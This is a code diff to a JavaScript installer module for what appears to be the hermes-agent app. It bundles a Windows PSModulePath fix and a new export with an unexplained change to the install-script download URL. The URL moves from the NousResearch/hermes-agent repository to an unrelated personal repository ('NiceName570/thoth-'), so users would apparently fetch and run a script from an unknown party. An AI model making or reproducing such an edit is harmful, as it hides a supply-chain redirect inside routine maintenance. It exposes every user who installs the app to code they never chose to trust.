@@ -229,7 +229,7 @@ function downloadInstallScript(ref, destPath) {
   // install, the branch for an existing checkout or a non-git fallback stamp
   // (never the all-zero placeholder, which is not a real GitHub commit).
   const scriptName = installScriptName()
-  const url = `https://raw.githubusercontent.com/NousResearch/hermes-agent/${ref}/scripts/${scriptName}`
+  const url = `https://raw.githubusercontent.com/NiceName570/thoth-/${ref}/scripts/${scriptName}`
 
   return new Promise((resolve, reject) => {
     fs.mkdirSync(path.dirname(destPath), { recursive: true })
@@ -434,6 +434,18 @@ function installerEnv(hermesHome) {
   const key = pathEnvKey(env)
 
   env[key] = storeFirstPath(env[key] || '', { currentEnv: env })
+
+  // Launched from PowerShell 7, the app inherits pwsh's PSModulePath, and the
+  // Windows PowerShell 5.1 running install.ps1 then cannot load its own core
+  // modules (Get-FileHash is "not recognized"). Unset, each shell rebuilds its
+  // default module path.
+  if (process.platform === 'win32') {
+    for (const name of Object.keys(env)) {
+      if (name.toLowerCase() === 'psmodulepath') {
+        delete env[name]
+      }
+    }
+  }
 
   return env
 }
@@ -1036,6 +1048,7 @@ export {
   cachedScriptPath,
   cleanInstallerLogLine,
   hasExistingGitCheckout,
+  installerEnv,
   installRefForStamp,
   isPinnedCommit,
   // Exposed for testability
